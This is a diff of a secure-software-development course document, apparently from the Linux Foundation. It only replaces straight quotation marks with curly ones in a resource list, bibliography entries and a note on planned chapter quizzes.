 
@@ -4881,11 +4881,11 @@ Hacker: "a person who delights in having an intimate understanding of the intern
 
 Many others discuss how to develop secure software. This course merely covers the fundamentals (as we see them). Here are some resources:
 
-* "Secure Software Design and Programming: Class Materials" by David A. Wheeler - [https://dwheeler.com/secure-class/](https://dwheeler.com/secure-class/) - lecture materials for a graduate class at George Mason University (GMU). This is a graduate class, so it goes into more detail.
+* “Secure Software Design and Programming: Class Materials” by David A. Wheeler - [https://dwheeler.com/secure-class/](https://dwheeler.com/secure-class/) - lecture materials for a graduate class at George Mason University (GMU). This is a graduate class, so it goes into more detail.
 
-* "Secure Programming HOWTO" - book by David A. Wheeler - [https://dwheeler.com/secure-programs/](https://dwheeler.com/secure-programs/)
+* “Secure Programming HOWTO” - book by David A. Wheeler - [https://dwheeler.com/secure-programs/](https://dwheeler.com/secure-programs/)
 
-* "Fundamental Practices for Secure Software Development, Third Edition" from SAFECode. SAFECode has published other useful materials, e.g., “Managing Security Risks Inherent in the Use of Third-party Components” and “Practices for Secure Development of Cloud Applications” - [https://safecode.org/publications/](https://safecode.org/publications/)
+* “Fundamental Practices for Secure Software Development, Third Edition” from SAFECode. SAFECode has published other useful materials, e.g., “Managing Security Risks Inherent in the Use of Third-party Components” and “Practices for Secure Development of Cloud Applications” - [https://safecode.org/publications/](https://safecode.org/publications/)
 
 * Secure Programming with Static Analysis by Brian Chess & Jacob West
 
@@ -4911,7 +4911,7 @@ Anderson, Ross, *Security Engineering: A Guide to Building Dependable Distribute
 
 Backus, J.W., R.J. Beeber, S. Best, R. Goldberg, H.L. Herrick, R.A. Hughes, L.B. Mitchell, R.A. Nelson, R. Nutt, D. Sayre, P.B. Sheridan, H. Stern, I. Ziller. *The FORTRAN Automatic Coding System for IBM 704 EDPM: Programmer’s Reference Manual*, Applied Science Division and Programming Research Department, International Business Machines Corporation, 1956-10-15 ([https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf](https://archive.computerhistory.org/resources/text/Fortran/102649787.05.01.acc.pdf))
 
-Bals, Fred, *The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*, Synopsys "Software Integrity" blog, 2018-08-14 ([https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/))
+Bals, Fred, *The AppSec alphabet soup: A guide to SAST, IAST, DAST, and RASP*, Synopsys “Software Integrity” blog, 2018-08-14 ([https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/](https://www.synopsys.com/blogs/software-security/sast-iast-dast-rasp-differences/))
 
 Barker, Elaine, *Recommendation for Key Management: Part 1 - General*, NIST Special Publication 800-57 Part 1 Revision 5, 2020,  ([https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf))
 
@@ -4983,7 +4983,7 @@ Hernan, Shawn; Lambert, Scott; Ostwald, Tomasz; Shostack, Adam, *Threat Modeling
 
 Householder, Allen, *The CERT Guide to Coordinated Vulnerability Disclosure*, 2019 ([https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure))
 
-Hubbard, Douglas, *The Failure of Risk Management: Why It's Broken and How to Fix It*, John Wiley & Sons. p. 46, 2009 ([https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536))
+Hubbard, Douglas, *The Failure of Risk Management: Why It’s Broken and How to Fix It*, John Wiley & Sons. p. 46, 2009 ([https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536))
 
 IETF RFC 1983, *Internet Users’ Glossary*  ([https://tools.ietf.org/html/rfc1983](https://tools.ietf.org/html/rfc1983))
 
@@ -4995,7 +4995,7 @@ Information Commissioner’s Office (ICO), *Guide to the General Data Protection
 
 International Association for Privacy Professionals (IAPP), *What does privacy mean?* ([https://iapp.org/about/what-is-privacy/](https://iapp.org/about/what-is-privacy/))
 
-ISO/IEC 9899:2018, *Programming Languages - C* (aka "C17").  This standard is not publicly available; its final draft is publicly available at ([https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf))
+ISO/IEC 9899:2018, *Programming Languages - C* (aka “C17”).  This standard is not publicly available; its final draft is publicly available at ([https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf))
 
 ISO/IEC 15026-2:2011, *Systems and software engineering - Systems and software assurance - Part 2: Assurance case* ([https://www.iso.org/standard/52926.html](https://www.iso.org/standard/52926.html))
 
@@ -5005,7 +5005,7 @@ kernel.org, *Linux kernel coding style* ([https://www.kernel.org/doc/Documentati
 
 Levien, Raph, *With Undefined Behavior, Anything is Possible*, 2018-08-17, ([https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html))
 
-Loukides, Mike, *Revisiting "What Is DevOps"*, 2014-06-30 ([http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html))
+Loukides, Mike, *Revisiting “What Is DevOps”*, 2014-06-30 ([http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html))
 
 MacCarthaigh, Colm, *Automated Reasoning and Amazon s2n*, 2016-09-08 ([https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/](https://aws.amazon.com/blogs/security/automated-reasoning-and-amazon-s2n/))
 
@@ -5083,7 +5083,7 @@ Saltzer, Jerome H., Schroeder, Michael D., *The Protection of Information in Com
 
 Scanlon, Thomas, *10 Types of Application Security Testing Tools: When and How to Use Them*, Software Engineering Institute (SEI) Blog, 2018-07-09 ([https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html](https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html))
 
-Schneier, Bruce, *Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*, Hearing on "Securing Consumers' Credit Data in the Age of Digital Commerce" before the Subcommittee on Digital Commerce and Consumer Protection, Committee on Energy and Commerce, United States House of Representatives, 2017-11-01 ([https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html))
+Schneier, Bruce, *Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*, Hearing on “Securing Consumers’ Credit Data in the Age of Digital Commerce” before the Subcommittee on Digital Commerce and Consumer Protection, Committee on Energy and Commerce, United States House of Representatives, 2017-11-01 ([https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html))
 
 Schneier, Bruce, *The Process of Security*, 2000 ([https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html))
 
@@ -5149,7 +5149,7 @@ Wheeler, David A., *The Apple goto fail vulnerability: lessons learned*, 2020-08
 
 The LF education team needs:
 
-1. overview for each chapter in each of the 3 courses along with learning objectives {This is already done above; see the text after each "Heading 1")
+1. overview for each chapter in each of the 3 courses along with learning objectives {This is already done above; see the text after each “Heading 1”)
 
 2. end of chapter graded quizzes: 3-6 questions, preferably multiple choice style
 
